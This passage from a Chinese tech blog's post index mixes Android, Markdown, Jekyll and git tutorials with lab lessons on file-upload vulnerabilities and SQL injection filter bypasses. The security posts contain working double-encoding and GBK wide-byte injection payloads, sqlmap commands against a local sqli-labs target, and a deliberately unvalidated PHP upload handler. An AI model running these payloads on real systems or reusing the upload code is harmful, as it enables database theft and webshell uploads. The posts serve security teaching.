\n2.浏览器形成POST MultiPart报文发送到服务器。（一般看不到 使用抓包工具查看content type 上传文件使用multipart提交）  \n3.服务器中间件接受到报文，解析后交给相关后端代码进行处理。（一般看不到 进行后端服务器编程 或 使用waf检测过程中）  \n4.后端代码将上传的文件内容写入到临时文件中（PHP特有 文件内容写入到临时文件 该代码结束 文件也会删除）。  \n5.写入到文件中，文件名为提交的文件名或以一定规则生成的文件名。（有的时候是上传的文件名或根据日期生成的文件名）  \n\n---\n选择文件-进行上传-开启截包工具forward-文件上传成功-访问文件  \n---\n\n通过burp截取到上传文件的请求信息  \n\n![通过burp截取到上传文件的请求信息](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/14/01.png)\n\n前端代码对应请求到的信息  \n![前端代码对应请求到的信息](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/14/02.png)\n\n前后端代码  \n![前后端代码 ](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/14/03.png)\n\n后端：\n\n\t<?php\n\t$uploaddir = 'uploads/';\n\tif (isset($_POST['submit']) {\n\t\tif(file_exists($uploaddir)) {\n\t\t\t// 将上传文件生成的临时文件移动到指定位置\n\t\t\tif (move_uploaded_file($_FILES['upfile']['tmp_name'], $uploaddir . '/' . $_FILES['upfile']['name'])) {\n\t\t\t\techo '文件上传成功，保存于：' . $uploaddir . $_FILES['upfile']['name'] . \"\\n\";\n\t\t\t}\n\t\t} else {\n\t\t\texit($uploaddir . '文件夹不存在，请手工创建!');\n\t\t}\n\t}\n\t?>\n\n\n前端：\n\n\t<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \n\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n\t<html xmlns=\"http://www.w3.org/1999/xhtml\">\n\t<head></head>\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html;charset=gbk\"/>\n\t\t<meta http-equiv=\"content_language\" content=\"zh-CN\"/>\n\t\t<title>文件上传漏洞演示脚本</title>\n\t\t<body>\n\t\t<h3>文件上传漏洞演示脚本</h3>\n\t\t<form>\n\t\t\t<input type=\"hidden\" name=\"MAX_FILE_SIZE\" vlaue=\"204800\"/>\n\t\t\t请选择要上传的文件：<input type=\"file\" name=\"upfile\"/>\n\t\t\t<input type=\"submit\" name=\"submit\" value=\"上传\"/>\n\t\t</form>\n\t\t</body>\n\t</html>\n---\n\n### 文件上传漏洞产生的原因\n\n> 当文件上传点未对上传的文件进行严格的验证和过滤时，就容易造成任意文件上传，包括上传动态文件（asp/php/jsp等等）。   \n> 如果上传的目标目录没有限制执行权限，导致所上传的动态文件（比如webshell）可以正常执行并且可以访问，即造成了文件上传漏洞。  \n\n**上传漏洞必要条件是：**\n\n1.存在上传点  \n2.可以上传动态文件  \n3.上传目录有执行权限，并且上传的文件可执行  \n4.可访问到上传的动态文件\n\n","tags":["文件上传漏洞"],"categories":["web安全"]},{"title":"一些天文的链接","url":"/post/2167877018.html","content":"[stuffin-一个在线星系模拟网站](http://stuffin.space)  \n[seti研究所](https://www.seti.org/)  \n[seti屏幕保护下载链接-帮助seti计算的一个软件](https://setiathome.berkeley.edu/join.php)","tags":["天文"],"categories":["biu"]},{"title":"android反编译工具和命令","url":"/post/4129675987.html","content":"\n## TOOLS\n\n[apktool](https://bitbucket.org/iBotPeaches/apktool/downloads/)  \n\n[apktool文档](https://ibotpeaches.github.io/Apktool/documentation/)  \n\n[dex2jar](https://sourceforge.net/projects/dex2jar/files/)  \n\n[jd-gui](http://jd.benow.ca/) \n\n[jadx](https://github.com/skylot/jadx/releases/tag/v0.7.1) \n\n\n## SHELL\n\n**jadx:**简直是神器啊  \n\n直接把apk拖进去就可以了  \n\n**apktool:**获取资源文件  \n\t\n\tjava -jar apktool.jar d -f <xx.apk> -o <XX>\n\n\tjava -jar apktool_2.3.3.jar d -f xx.apk -o XX\n\n**dex2jar:**获取java代码  \n\t\n\t1.把apk的后缀名修改成.zip\n\t2.解压\n\t3.获取classes.dex(可能是安卓64k包所以会有多个classes.dex，有的时候会有好几个，可能因为混淆，或者加了壳，现在裸奔的应用很少了吧)\n\t4.把classes.dex 文件放到 dex2jar 文件夹内\n\n\t命令：\n\n\td2j-dex2jar classes.dex // 会生成classes-dex2jar.jar\n\n\tmac:\n\tsh d2j-dex2jar.sh classes.dex\n\n\n**jd-gui:**查看代码工具\n\n\t使用jd-gui打开classes-dex2jar.jar就可以看到源代码了\n\n\n## 遇到的一些问题\n\n使用dex2jar会提示没有权限  \n> d2j-dex2jar.sh: line 36: ./d2j_invoke.sh: Permission denied  \n\n使用命令把dex2jar提升下权限就可以了  \n\n\tsudo chmod -R 777 dex2jar-2.0\n\n## 相关链接\n\n[Android 反编译神器jadx的使用](https://blog.csdn.net/Fisher_3/article/details/78654450)  \n","tags":["android逆向","adnroid安全","android反编译"],"categories":["android逆向"]},{"title":"2.Markdown使用说明","url":"/post/4082916186.html","content":"\n## 一、Markdown是什么？\n\nMarkdown是一种轻量级标记语言（标记语言是用一系列规则描述简单格式的文本语言。）    \n\n## 二、Markdown的语法\n\n1.标题  \n\\# 一级标题  \n\\#\\# 二级标题  \n\n还可以下面这种写法  \n\n一级标题  \n\\====  \n\n二级标题  \n\\----  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/01.png)\n\n2.图片  \n\\!\\[图片文字\\]\\(图片链接\\)\n\\!\\[Foo\\]\\(http://i.weather.com.cn/images/cn/life/2017/04/11/11141533DF572FBBA092E37E6E843C656C318272.jpg)  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/02.png)\n\n3.换行  \n强制在末尾加两个空格 或者 加<br/>  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/03.png)\n\n4.斜体／粗体／删除线  \n斜体：  \n\\*hello\\*  \n\\_你好\\_  \n\n粗体：  \n\\**hello\\**  \n\\_\\_你好\\_\\_  \n\n删除线：  \n\\~\\~这是加删除线的文字\\~\\~\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/04.png)\n\n\n5.引用  \n\\> 引用  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/05.png)\n\n\n\\> 引用  \n\\>\\> 引用的引用  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/06.png)\n\n\n或者这样写：  \n\n\t<blockquote><p>引用</p></blockquote>\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/07.png)\n\n\n6.链接\n\\[链接文字\\](链接)  \n\\[百度](http://www.baidu.com)  \n\n或者这样写：  \n\\[链接文字][链接引用标签]  \n\\[链接引用标签]: 链接地址 \"链接标题\"  \n\n\\[百度][tag]  \n\\[tag]: http://www.baidu.com \"百度\"  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/08.png)\n\n\n7.分割线（不同的编辑器可能显示的形式不一样）  \n\\***  \n\\__  \n\\___  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/09.png)\n\n\n8.列表  \n\\+ aaa  \n\\+ bbb  \n\\+ ccc  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/10.png)\n\n\n### 更多语法\nhttp://www.markdown.cn/\n### md高级用法\nhttps://www.jianshu.com/p/0b257de21eb5\n\n## 三、Markdown编辑器\n\n\n  ● Cmd Markdown https://www.zybuluo.com/mdeditor   编辑阅读器，支持实时同步预览，区分写作和阅读模式，支持在线存储，分享文稿网址。  \n  ● MacDown http://macdown.uranusjr.com macOS 上的 Markdown 开源编辑器，作者称其深受 Mou 启发。  \n  ● Mou http://25.io/mou/ 一个 macOS 上的Markdown编辑器。  \n  ● MarkdownPad http://www.markdownpad.com Windows上的全功能 Markdown 编辑器。  \n  ● MarkPad http://code52.org/DownmarkerWPF/  Windows上的Markdown编辑器，Markdown works better with MarkPad。  \n  ● Typora https://www.typora.io/  \n在线：  \n  ● Dillinger.io https://dillinger.io 一个在线Markdown编辑器，提供实时预览以及到 GitHub 和 Dropbox 的拓展连接。  \n  ● MaHua http://mahua.jser.me/ 一个在线编辑markdown文档的编辑器 向Mac下优秀的markdown编辑器mou致敬。  \n  ● 马克飞象 https://maxiang.io/    马克飞象是一款专为印象笔记（Evernote）打造的Markdown编辑器。  \n\n如果你是微信公众号er   \n推荐Markdown Here这个chrome插件（需要翻墙）. \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/11.png)\n\n\n步骤：  \n把用Markdown写作的文章复制过来，粘在微信后台的文本框中  \n快捷键按住Control+Alt+M，即可转换成最终呈现出来的文字格式  \n需要修改图片地址等。  \n\n## 四、jekyll中使用Markdown\n\n在blog文件夹中有一个_posts的文件夹 是存放所有文章的  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/12.png)\n\n\n进入_posts文件夹  \n创建 日期-标题.md 的文件  \n如：  \n2018-05-24-test.md  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/13.png)\n\n\n打开新建的文件 添加这些  \n\n\t---\n\tlayout: post\n\ttitle: test\n\t---\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/14.png)\n\n\n现在开始用markdown写一篇文章  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/15.png)\n\n\n运行jekyll服务  \njekyll serve  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/16.png)\n\n\n在浏览器中访问  \n\n\thttp://127.0.0.1:4000/\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/17.png)\n\n\n访问文章就可以出现下面的  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/18.png)\n\n\n之后你就可以把文章提交到github上了  \n\n打开终端输入  \n\n\tcd 用户名.github.io\n\tgit add --all\n\tgit commit -m \"add post\"\n\tgit push -u origin master\n\n## 五、Markdown图片处理\n\n我选择的是微博的微相册作为图床  \n微相册地址   \nhttp://photo.weibo.com/5500195491/upload/index \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/13/19.png)\n\n\n就是选择照片->上传照片->返回相册->点开大图->复制图片地址  \n\n**拖拽上传图床工具**\nmac：  \nipic 在appstore搜索  \nwindow  \nmpic 在 http://mpic.lzhaofu.cn/ 下载  \n---\n\n## 拓展阅读\n如何通过markdown写论文？ https://sspai.com/post/43471  \n","tags":["blog","jekyll"],"categories":["jekyll"]},{"title":"1.4.2-SQL注入防御绕过-二次编码注入","url":"/post/41038608.html","content":"\n## 01 二次编码注入原理\n\n+，=，&，；  \n原始数据不适合传输  \n\n\tindex.php?id=1&name=admin&pwd=123\n\n\tname=admin=\n\tname=admin&\n\n\tadmin=\n\n\tphp urldecode('%3d') --> =\n\n\t// 如果这样的参数会引起歧义\n\nphp会自动解码  \n\n二次编码注入：  \nurldecode()与PHP本身处理编码时，两者配合失误，可构造数据消灭\\  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/10/01.png)\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/10/02.png)\n\n\n\n\n## 02 二次编码注入方法\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/10/03.png)\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/10/04.png)\n\n\n\thttp://127.0.0.1/Less-1/double.php?id=1%2527 // 测试注入点\n\thttp://127.0.0.1/Less-1/double.php?id=1%2527%20order%20by%203 //测试长度\n\thttp://127.0.0.1/Less-1/double.php?id=1%27 order by 4--+\n\thttp://127.0.0.1/\n\n\n\tsqlmap:\n\tsqlmap -u \"http://127.0.0.1/Less-1/double.php?id=1%25\"\n\n\tsqlmap -u \"http://127.0.0.1/Less-1/double.php?id=1%2527\" --current--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/10/05.png)\n\n","tags":["sql注入"],"categories":["web安全"]},{"title":"android思维导图","url":"/post/758044765.html","content":"\n[android思维导图](https://tea9.xyz/pdf/Android_Mind_Map.pdf)","tags":["android"],"categories":["android"]},{"title":"1.自制脚本语言-第一章笔记","url":"/post/395714690.html","content":"这是一个读两周自制脚本语言的笔记，然后立flag，这个月打算看完  \n\n# day 1\n## 1.1 机器语言 & 汇编语言\n\n+ 机器语言： 不需要借助软件执行，不需要语言处理器，可以由硬件直接解释执行 一个位数很长的二进制数字\n\n+ 汇编语言： 通过汇编语言程序表述巨大的数字，使其易于理解，需要通过软件转换成机器语言，这种软件称为汇编程序。汇编程序是一种最基本的语言处理器\n\n\n## 1.2 解释器 & 编译器\n\n+ 解释器： 根据程序中的算法执行运算，执行程序的软件  \n如果执行的程序由虚拟机语言或类似机器语言程序设计语言写成，这种软件也能称为虚拟机\n\n+ 编译器： 能将某种语言写成的程序转换为另一种语言的程序 \n编译器转换程序的行为称为编译，转换前的程序称为源代码或源程序。  \n如果编译器没有把源代码直接转换为机器语言，称为源代码转换器或源码转换器\n\n## 1.3 开发语言处理器\nStone语言 运行于 Java虚拟机\n\n\n## 1.4 语言处理器的结构与本书的框架\n\n源代码首先将进行词法分析，由一长串字符串细分为多个更小的字符串单元。分割后的字符串称为单词。之后处理器将执行语法分析处理，把单词的排列转换为抽象语法树。 之后 编译器会把抽象语法树转换为其他语言，而解释器将会一边分析抽象语法树一边执行运算\n","tags":["脚本语言"],"categories":["脚本语言"]},{"title":"1.android布局-ConstraintLayout-约束布局","url":"/post/3011557691.html","content":"\n## ConstraintLayout 是什么？\n\n[ConstraintLayout](https://developer.android.google.cn/reference/android/support/constraint/ConstraintLayout)\n\n## ConstraintLayout 怎么用？\n\n**基本用法**\n\n    layout_constraint[当前控件位置]_[目标控件位置]=\"[目标控件ID]\"\n\n1.上下排列  \n\n\ta  \n\tb  \n\n\tb:\n\tapp:layout_constraintTop_toBottomOf=\"a\"\n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            android:text=\"@string/a\" />\n    \n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            android:text=\"@string/b\"\n            app:layout_constraintTop_toBottomOf=\"@id/a\" />\n    </android.support.constraint.ConstraintLayout>\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/1.png)\n\n2.左右排列  \n\n\ta b\n    a:\n    app:layout_constraintRight_toLeftOf=\"b\"\n\tb:\n\tapp:layout_constraintLeft_toRightOf=\"a\"\n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintRight_toLeftOf=\"@id/b\"\n            android:text=\"@string/a\" />\n    \n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            android:text=\"@string/b\"\n            app:layout_constraintLeft_toRightOf=\"@id/a\" />\n    </android.support.constraint.ConstraintLayout>\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/2.png)\n\n左右排列更严谨的写法   \n\n    a b\n    b:\n    app:layout_constraintStart_toEndOf=\"a\"\n    app:layout_constraintTop_toTopOf=\"a\"\n    app:layout_constraintBottom_toBottomOf=\"a\"\n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintRight_toLeftOf=\"@id/b\"\n            app:layout_constraintEnd_toStartOf=\"@id/b\"\n            app:layout_constraintTop_toTopOf=\"@id/b\"\n            android:text=\"@string/a\" />\n\n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            android:text=\"@string/b\"\n            app:layout_constraintStart_toEndOf=\"@id/a\"\n            app:layout_constraintTop_toTopOf=\"@id/a\"\n            app:layout_constraintLeft_toRightOf=\"@id/a\" />\n    </android.support.constraint.ConstraintLayout>\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/2.png)\n\n3.靠最右边  \n\n\ta 靠界面最右边\n\ta：\n\tapp:layout_constraiontEnd_toEndOf=\"parent\"\n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintEnd_toEndOf=\"parent\"\n            android:text=\"@string/a\" />\n    </android.support.constraint.ConstraintLayout>\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/3.png)\n\n\tconstraiontEnd 是自己本身的\n\ttoEnd 底部停靠的\n    parent 是父布局\n\n4.三等分然后停靠最底部  \n\n    a b c\n    a:\n    app:layout_constraiontBottom_toBottomOf=\"parent\"\n    app:layout_constraiontLeft_toLeftOf=\"parent\"\n    app:layout_constraiontRight_toLeftOf=\"b\"\n\n    b:\n    app:layout_constraiontBottom_toBottomOf=\"parent\"\n    app:layout_constraiontLeft_toRightOf=\"a\"\n    app:layout_constraiontRight_toLeftOf=\"c\"\n\n    c:\n    app:layout_constraiontBottom_toBottomOf=\"parent\"\n    app:layout_constraiontLeft_toRightOf=\"b\"\n    app:layout_constraiontRight_toRightOf=\"parent\"\n\n上面就是构成官网所说的链(chain)  \n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintLeft_toLeftOf=\"parent\"\n            app:layout_constraintRight_toLeftOf=\"@id/b\"\n            android:text=\"@string/a\" />\n    \n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintLeft_toRightOf=\"@id/a\"\n            app:layout_constraintRight_toLeftOf=\"@id/c\"\n            android:text=\"@string/b\"/>\n        <TextView\n            android:id=\"@+id/c\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintRight_toRightOf=\"parent\"\n            app:layout_constraintLeft_toRightOf=\"@id/b\"\n            android:text=\"@string/c\"/>\n    </android.support.constraint.ConstraintLayout>\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/4.png)\n\n延伸两个属性\n    \n    app:layout_constraiontHorizontal_weight=\"1\" //等分属性\n    \n    app:layout_constraiontHorizontal_chainstyle=\"spread_inside\" //spread_inside 两端对齐 packed 聚中  spread(默认)控件之间留空\n\n实例：  \n聚中：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintHorizontal_chainStyle=\"packed\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintLeft_toLeftOf=\"parent\"\n            app:layout_constraintRight_toLeftOf=\"@id/b\"\n            android:text=\"@string/a\" />\n\n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintLeft_toRightOf=\"@id/a\"\n            app:layout_constraintRight_toLeftOf=\"@id/c\"\n            android:text=\"@string/b\"/>\n        <TextView\n            android:id=\"@+id/c\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintRight_toRightOf=\"parent\"\n            app:layout_constraintLeft_toRightOf=\"@id/b\"\n            android:text=\"@string/c\"/>\n    </android.support.constraint.ConstraintLayout>\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/5.png)\n\n左右分散：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintHorizontal_chainStyle=\"spread_inside\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintLeft_toLeftOf=\"parent\"\n            app:layout_constraintRight_toLeftOf=\"@id/b\"\n            android:text=\"@string/a\" />\n\n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintLeft_toRightOf=\"@id/a\"\n            app:layout_constraintRight_toLeftOf=\"@id/c\"\n            android:text=\"@string/b\"/>\n        <TextView\n            android:id=\"@+id/c\"\n            style=\"@style/text\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintRight_toRightOf=\"parent\"\n            app:layout_constraintLeft_toRightOf=\"@id/b\"\n            android:text=\"@string/c\"/>\n    </android.support.constraint.ConstraintLayout>\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/6.png)\n\n---\n### Guideline （约束线）\n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n\n        <android.support.constraint.Guideline\n            android:id=\"@+id/guideline\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\"\n            android:orientation=\"vertical\"\n            app:layout_constraintGuide_percent=\"0.5\" />\n\n        <Button\n            android:id=\"@+id/button\"\n            android:layout_width=\"wrap_content\"\n            android:layout_height=\"wrap_content\"\n            android:text=\"Button\"\n            app:layout_constraintBottom_toBottomOf=\"parent\"\n            app:layout_constraintEnd_toStartOf=\"@+id/guideline\"\n            app:layout_constraintWidth_default=\"spread\" />\n\n        <Button\n            android:id=\"@+id/button2\"\n            android:layout_width=\"wrap_content\"\n            android:layout_height=\"wrap_content\"\n            android:text=\"Button\"\n            app:layout_constraintBottom_toBottomOf=\"@+id/button\"\n            app:layout_constraintStart_toStartOf=\"@+id/guideline\"\n            app:layout_constraintTop_toTopOf=\"@+id/button\" />\n    </android.support.constraint.ConstraintLayout>\n\n\n\n    Guideline 是一个约束线（不会画出来）\n    app:layout_constraintGuide_percent=\"0.5\" 0.5是50%\n    上面代码是 在视图50%位置 左右两边有两个butthon\n    \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/7.png)\n\n实例：  \n\n    <android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n    \n        <android.support.constraint.Guideline\n            android:id=\"@+id/guideline\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\"\n            android:orientation=\"horizontal\"\n            app:layout_constraintGuide_begin=\"40dp\"/>\n        \n        <TextView\n            android:id=\"@+id/a\"\n            style=\"@style/text\"\n            app:layout_constraintTop_toTopOf=\"@id/guideline\"\n            android:text=\"@string/a\"/>\n        <TextView\n            android:id=\"@+id/b\"\n            style=\"@style/text\"\n            app:layout_constraintTop_toTopOf=\"@id/guideline\"\n            app:layout_constraintLeft_toRightOf=\"@id/a\"\n            android:text=\"@string/b\"/>\n        <TextView\n            android:id=\"@+id/c\"\n            style=\"@style/text\"\n            app:layout_constraintTop_toTopOf=\"@id/guideline\"\n            app:layout_constraintLeft_toRightOf=\"@id/b\"\n            android:text=\"@string/c\"/>\n    </android.support.constraint.ConstraintLayout>\n\n    在40dp上画一条约束线 \n    textview以此排列\n\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/19/8.png)\n\n\n\n## 源码\n[源码](https://github.com/tea9/dear_kotlin_code/tree/master/constraintlayout/src/main/res/layout)\n\n## 相关链接\n\n[ConstraintLayout详解](https://www.jianshu.com/p/768b9e47a77b)  \n\n[Android新特性介绍，ConstraintLayout完全解析](https://blog.csdn.net/guolin_blog/article/details/53122387)  \n[Constraint Layout 1.1.x带来了哪些新东西？](http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2017/1019/8618.html)  \n[未来布局之星——ConstraintLayout](https://www.jianshu.com/p/c34ce21f77b3)  \n[ConstraintLayout使用的一些坑](https://blog.csdn.net/jxb196203/article/details/80695410)  \n[Android约束布局ConstraintLayout 项目实战攻略](https://blog.csdn.net/silenceoo/article/details/78556409)  \n[Android ConstraintLayout详解](https://www.jianshu.com/p/768b9e47a77b)   \n[实战篇ConstraintLayout的崛起之路](https://www.jianshu.com/p/a74557359882)  \n[关于ConstraintLayout与Recycleview使用中的一些坑](https://blog.csdn.net/android_mh/article/details/79022738)  \n[ConstraintLayout使用的一些坑](https://blog.csdn.net/jxb196203/article/details/80695410)\n","tags":["android"],"categories":["android"]},{"title":"1.4.1-SQL注入防御绕过-宽字节注入","url":"/post/2024290485.html","content":"\n## 01 宽字节注入原理\n\n> 什么是宽字节\n> GB2312、GBK、GB8030、BIG5、Shift_JIS等这些都是常说的宽字节，实际为两字节。\n\n站点可能为了防止SQL注入，会加\\转义'，最后变成\\'  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/01.jpeg)\n\nMySQL在使用GBK编码的时候，会认为两个字符为一个汉字。\n使用%df'进行编码，两个字符组合，认为是一个汉字。  \n注：前一个Ascii码大于128才能到汉字的范围\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/02.jpeg)\n\n## 02 宽字节注入方法\n\n\thttp://127.0.0.1/sqli-labs/Less-32/?id=%df' union select 1,(select user()),3--+\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/03.jpeg)\n\n\thttp://127.0.0.1/sqli-labs/Less-32/?id=%df' union select 1,(select table_name from information_schema.tables where table_schema=database() limit 0,1),3--+ // 查表\n\n\tsqlmap:\n\tsqlmap -u \"http://127.0.0.1/Less-32/?id=1\" // 判断id不是注入点 因为被转义\n\n\tsqlmap -u \"http://127.0.0.1/Less-32/?id=1%df\" // 通过宽字节注入\n\n--- \n\n> 宽字节注入应对策略：\n+ 使用utf-8,避免宽字节注入；\nps：不仅在gbk，韩文、日文等等都是宽字节，都有可能存在宽字节注入漏洞。\n\n+ mysql_real_escape_string,mysql_set_charset('gbk',$conn) // 替换 和 编码 两个函数一起使用\n\n+ 可以设置参数，charcater_set_client=binary // 设置mysql的连接参数，使用二进制模式\n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/09/04.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["sql注入","web安全"],"categories":["web安全"]},{"title":"github上fork了别人的项目后，再同步更新别人的提交","url":"/post/2129490429.html","content":"\n[github上fork了别人的项目后，再同步更新别人的提交](https://blog.csdn.net/qq1332479771/article/details/56087333)\n\n\n\t\n\tgit remote -v\n\tgit remote add upstream aaa\n\tgit remote -v\n\tgit remote remove upstream\n\n\t4.重新添加源代码库\n\tgit remote add upstream <fork link>\n\tgit remote -v\n\n\t5.从源仓库更新同步代码\n\tgit fetch upstream\n\n\t6.合并到本地代码库\n\tgit merge upstream/master\n\n\t7.拉取远程代码库\n\tgit pull origin master\n\n\t8.更新远程代码库\n\tgit push \n","tags":["马克","git"],"categories":["git"]},{"title":"jekyll-theme-H2O的gitalk相关配置","url":"/post/2319578569.html","content":"\n[jekyll-theme-H2O](https://github.com/tea9/jekyll-theme-H2O)的gitalk配置\n\n[gitalk](https://github.com/gitalk/gitalk)\n\n## 01.注册GitHub Application\n\n[注册GitHub Application](https://github.com/settings/applications/new)\n\n<pre>\n\t<code class=\"language-javascript\">\nApplication name:项目名称  \nHomepage URL:域名地址  \nApplication description:项目描述  \nAuthorization callback URL:回掉地址  \n\t</code>\n</pre>\n\n![注册GitHub Application](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/07/01.png)\n\n![Client ID](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/07/02.png)\n\n注册成功后会获得Client ID和Client Secret  \n\n## 02.配置_config.yml\n\n<pre>\n\t<code class=\"language-javascript\">\ngitalk: true\ngitalk_clientID: 'clientID'\ngitalk_Secret: 'Secret'\ngitalk_repo: '用户名.github.io'\ngitalk_owner: 'github用户名'\ngitalk_admin: 'github用户名'\ndistractionFreeMode: true\n\t</code>\n</pre>\n\n![config](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/07/03.png)\n\n## 03.修改post.html\n\n[post.html]()\n\n\t\n\t var gitalk = new Gitalk({\n\t\t  clientID: '{{ site.comments.gitalk_clientID }}',\n\t\t  clientSecret: '{{ site.comments.gitalk_Secret }}',\n\t\t  repo: '{{ site.comments.gitalk_repo }}',\n\t\t  owner: '{{ site.comments.gitalk_owner }}',\n\t\t  admin: '{{ site.comments.gitalk_admin }}',\n\t\t  id: location.pathname,      // Ensure uniqueness and length less than 50{{ page.title }}\n\t\t  